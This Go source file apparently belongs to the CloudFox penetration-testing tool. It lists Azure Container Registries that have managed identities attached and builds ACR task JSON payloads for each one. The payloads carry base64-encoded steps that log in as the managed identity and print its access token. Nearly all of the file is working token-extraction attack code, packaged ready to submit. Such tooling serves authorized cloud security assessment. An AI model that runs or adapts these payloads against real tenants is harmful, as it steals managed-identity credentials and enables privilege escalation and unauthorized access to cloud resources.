package azure

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/containerregistry/armcontainerregistry"
	"github.com/BishopFox/cloudfox/globals"
)

// ==================== ACR MANAGED IDENTITY STRUCTURES ====================

// ACRManagedIdentity represents a Container Registry with attached managed identities
type ACRManagedIdentity struct {
	RegistryName    string
	ResourceGroup   string
	SubscriptionID  string
	Location        string
	IdentityType    string // "SystemAssigned", "UserAssigned", or "SystemAssigned, UserAssigned"
	SystemAssigned  bool
	UserAssignedIDs []UserAssignedManagedIdentity // List of user-assigned identity IDs
}

// UserAssignedManagedIdentity represents a single user-assigned managed identity
type UserAssignedManagedIdentity struct {
	ResourceID  string
	ClientID    string
	PrincipalID string
}

// ACRTaskTemplate represents a generated ACR task template for token extraction
type ACRTaskTemplate struct {
	RegistryName string
	TaskName     string
	IdentityType string
	IdentityID   string
	TokenScope   string
	TaskJSON     string // Complete JSON payload for task creation
	RunJSON      string // Complete JSON payload for task execution
}

// ==================== ACR MANAGED IDENTITY HELPERS ====================

// GetACRsWithManagedIdentities retrieves all ACRs with managed identities in specified resource groups
func GetACRsWithManagedIdentities(session *SafeSession, subscriptionID string, resourceGroups []string) ([]ACRManagedIdentity, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}
	cred := &StaticTokenCredential{Token: token}
	ctx := context.Background()

	client, err := armcontainerregistry.NewRegistriesClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	var results []ACRManagedIdentity

	// If specific resource groups provided, enumerate those
	if len(resourceGroups) > 0 {
		for _, rgName := range resourceGroups {
			pager := client.NewListByResourceGroupPager(rgName, nil)
			for pager.More() {
				page, err := pager.NextPage(ctx)
				if err != nil {
					continue
				}
				for _, reg := range page.Value {
					if acr := convertACRWithIdentity(reg, rgName, subscriptionID); acr != nil {
						results = append(results, *acr)
					}
				}
			}
		}
	} else {
		// Otherwise, enumerate all ACRs in subscription
		pager := client.NewListPager(nil)
		for pager.More() {
			page, err := pager.NextPage(ctx)
			if err != nil {
				return results, err
			}
			for _, reg := range page.Value {
				rgName := GetResourceGroupFromID(SafeStringPtr(reg.ID))
				if acr := convertACRWithIdentity(reg, rgName, subscriptionID); acr != nil {
					results = append(results, *acr)
				}
			}
		}
	}

	return results, nil
}

// convertACRWithIdentity converts SDK ACR to our struct, filtering for managed identities
func convertACRWithIdentity(reg *armcontainerregistry.Registry, resourceGroup, subscriptionID string) *ACRManagedIdentity {
	// Skip if no identity attached
	if reg.Identity == nil || reg.Identity.Type == nil {
		return nil
	}

	identityType := string(*reg.Identity.Type)

	// Skip if identity type is "None"
	if identityType == "None" {
		return nil
	}

	acr := &ACRManagedIdentity{
		RegistryName:    SafeStringPtr(reg.Name),
		ResourceGroup:   resourceGroup,
		SubscriptionID:  subscriptionID,
		Location:        SafeStringPtr(reg.Location),
		IdentityType:    identityType,
		UserAssignedIDs: []UserAssignedManagedIdentity{},
	}

	// Check for system-assigned identity
	if identityType == "SystemAssigned" || identityType == "SystemAssigned, UserAssigned" {
		acr.SystemAssigned = true
	}

	// Check for user-assigned identities
	if reg.Identity.UserAssignedIdentities != nil {
		for resourceID, identity := range reg.Identity.UserAssignedIdentities {
			uami := UserAssignedManagedIdentity{
				ResourceID: resourceID,
			}
			if identity != nil {
				uami.ClientID = SafeStringPtr(identity.ClientID)
				uami.PrincipalID = SafeStringPtr(identity.PrincipalID)
			}
			acr.UserAssignedIDs = append(acr.UserAssignedIDs, uami)
		}
	}

	return acr
}

// GenerateACRTaskTemplates generates ACR task JSON templates for token extraction
func GenerateACRTaskTemplates(acr ACRManagedIdentity, tokenScope string) []ACRTaskTemplate {
	var templates []ACRTaskTemplate

	// Generate template for system-assigned identity
	if acr.SystemAssigned {
		template := generateSystemAssignedTaskTemplate(acr, tokenScope)
		templates = append(templates, template)
	}

	// Generate templates for each user-assigned identity
	for _, uami := range acr.UserAssignedIDs {
		template := generateUserAssignedTaskTemplate(acr, uami, tokenScope)
		templates = append(templates, template)
	}

	return templates
}

// generateSystemAssignedTaskTemplate creates a task template for system-assigned identity
func generateSystemAssignedTaskTemplate(acr ACRManagedIdentity, tokenScope string) ACRTaskTemplate {
	taskName := "SystemAssignedTokenTask"

	// Build the task steps - az login with system identity, then get access token
	taskSteps := fmt.Sprintf("version: v1.1.0\nsteps:\n  - cmd: az login --identity --allow-no-subscriptions\n  - cmd: az account get-access-token --resource=%s", tokenScope)
	taskb64 := base64.StdEncoding.EncodeToString([]byte(taskSteps))

	// Build task creation JSON
	taskBody := map[string]interface{}{
		"location": acr.Location,
		"properties": map[string]interface{}{
			"status": "Enabled",
			"platform": map[string]interface{}{
				"os":           "Linux",
				"architecture": "amd64",
			},
			"agentConfiguration": map[string]interface{}{
				"cpu": 2,
			},
			"timeout": 3600,
			"step": map[string]interface{}{
				"type":               "EncodedTask",
				"encodedTaskContent": taskb64,
				"values":             "",
			},
			"trigger": map[string]interface{}{
				"baseImageTrigger": map[string]interface{}{
					"name":                     "defaultBaseimageTriggerName",
					"updateTriggerPayloadType": "Default",
					"baseImageTriggerType":     "Runtime",
					"status":                   "Enabled",
				},
			},
		},
		"identity": map[string]interface{}{
			"type": "SystemAssigned",
		},
	}

	// Build task run JSON
	runBody := map[string]interface{}{
		"type":             "TaskRunRequest",
		"isArchiveEnabled": false,
		"taskId":           fmt.Sprintf("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ContainerRegistry/registries/%s/tasks/%s", acr.SubscriptionID, acr.ResourceGroup, acr.RegistryName, taskName),
		"TaskName":         taskName,
		"overrideTaskStepProperties": map[string]interface{}{
			"arguments": []string{},
			"values":    []string{},
		},
	}

	taskJSON, _ := json.MarshalIndent(taskBody, "", "  ")
	runJSON, _ := json.MarshalIndent(runBody, "", "  ")

	return ACRTaskTemplate{
		RegistryName: acr.RegistryName,
		TaskName:     taskName,
		IdentityType: "SystemAssigned",
		IdentityID:   "SystemAssigned",
		TokenScope:   tokenScope,
		TaskJSON:     string(taskJSON),
		RunJSON:      string(runJSON),
	}
}

// generateUserAssignedTaskTemplate creates a task template for user-assigned identity
func generateUserAssignedTaskTemplate(acr ACRManagedIdentity, uami UserAssignedManagedIdentity, tokenScope string) ACRTaskTemplate {
	// Extract identity name from resource ID
	identityName := GetResourceNameFromID(uami.ResourceID)
	taskName := fmt.Sprintf("UserAssigned_%s_TokenTask", identityName)

	// Build the task steps - az login with user-assigned identity (using client ID), then get access token
	taskSteps := fmt.Sprintf("version: v1.1.0\nsteps:\n  - cmd: az login --identity --allow-no-subscriptions --username %s\n  - cmd: az account get-access-token --resource=%s", uami.ClientID, tokenScope)
	taskb64 := base64.StdEncoding.EncodeToString([]byte(taskSteps))

	// Build task creation JSON
	taskBody := map[string]interface{}{
		"location": acr.Location,
		"properties": map[string]interface{}{
			"status": "Enabled",
			"platform": map[string]interface{}{
				"os":           "Linux",
				"architecture": "amd64",
			},
			"agentConfiguration": map[string]interface{}{
				"cpu": 2,
			},
			"timeout": 3600,
			"step": map[string]interface{}{
				"type":               "EncodedTask",
				"encodedTaskContent": taskb64,
				"values":             "",
			},
			"trigger": map[string]interface{}{
				"baseImageTrigger": map[string]interface{}{
					"name":                     "defaultBaseimageTriggerName",
					"updateTriggerPayloadType": "Default",
					"baseImageTriggerType":     "Runtime",
					"status":                   "Enabled",
				},
			},
		},
		"identity": map[string]interface{}{
			"type": "SystemAssigned, UserAssigned",
			"userAssignedIdentities": map[string]interface{}{
				uami.ResourceID: map[string]interface{}{},
			},
		},
	}

	// Build task run JSON
	runBody := map[string]interface{}{
		"type":             "TaskRunRequest",
		"isArchiveEnabled": false,
		"taskId":           fmt.Sprintf("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ContainerRegistry/registries/%s/tasks/%s", acr.SubscriptionID, acr.ResourceGroup, acr.RegistryName, taskName),
		"TaskName":         taskName,
		"overrideTaskStepProperties": map[string]interface{}{
			"arguments": []string{},
			"values":    []string{},
		},
	}

	taskJSON, _ := json.MarshalIndent(taskBody, "", "  ")
	runJSON, _ := json.MarshalIndent(runBody, "", "  ")

	return ACRTaskTemplate{
		RegistryName: acr.RegistryName,
		TaskName:     taskName,
		IdentityType: "UserAssigned",
		IdentityID:   uami.ResourceID,
		TokenScope:   tokenScope,
		TaskJSON:     string(taskJSON),
		RunJSON:      string(runJSON),
	}
}

// GetResourceNameFromID extracts the resource name from an Azure resource ID
func GetResourceNameFromID(resourceID string) string {
	// Azure resource IDs are in format: /subscriptions/{sub}/resourceGroups/{rg}/providers/{provider}/{type}/{name}
	parts := []rune{}
	for i := len(resourceID) - 1; i >= 0; i-- {
		if resourceID[i] == '/' {
			break
		}
		parts = append([]rune{rune(resourceID[i])}, parts...)
	}
	return string(parts)
}
